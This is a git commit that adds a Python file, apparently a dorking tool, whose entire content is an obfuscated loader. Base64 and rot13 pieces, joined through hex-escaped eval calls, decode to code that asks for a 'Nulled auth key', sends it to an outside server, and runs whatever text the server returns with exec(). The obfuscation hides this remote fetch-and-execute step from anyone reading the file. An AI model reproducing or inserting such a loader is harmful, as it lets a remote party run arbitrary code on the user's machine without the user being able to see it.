1132c96eb54ab65934427d473e0aa1c4a77526eb
TheWestonGuy <56186066+TheWestonGuy@users.noreply.github.com>
2020-03-04 23:36:56 +0200

    Add files via upload

---
+++ Dorko Release 1.0 by CYBER/Dorko.py
@@ -0,0 +1,8 @@
+import base64, codecs
+magic = 'aW1wb3J0IHJhbmRvbQppbXBvcnQgcHlmaWdsZXQKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIEJhY2ssIFN0eWxlCgp2YWxpZCA9IEZhbHNlCgp3aGlsZSh2YWxpZ'
+love = 'PN9CFOTLJkmMFxtBtbtVPNtn2I5VQ0tnJ5jqKDbEz9lMF5MEHkZG1peW0IhqTIlVUyiqKVtGaIfoTIxVTS1qTttn2I5BvNaXDbtVPNtpUWcoaDbEz9lMF5UHxISGvfaGT9aM2yhMlOcov4hYvpcPv'
+god = 'AgICByZXEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vY3liZXIwLnByby9weXRvb2xzL2RvcmtvLnBocD9rZXk9JytrZXkpCiAgICBpZihyZXEudGV4dCA9PSAiaW52YWxpZCBiaXRjaCIpIDoKICA'
+destiny = 'tVPNtVPOjpzyhqPuTo3WyYyWSEPfvFJ52LJkcMPOeMKxfVUOfMJSmMFO0paxtLJqunJ4uVvxXVPNtVTIfp2HtBtbtVPNtVPNtVUMuoTyxVQ0tIUW1MDbtVPNtVPNtVTI4MJZbpzIkYaEyrUDcPt=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
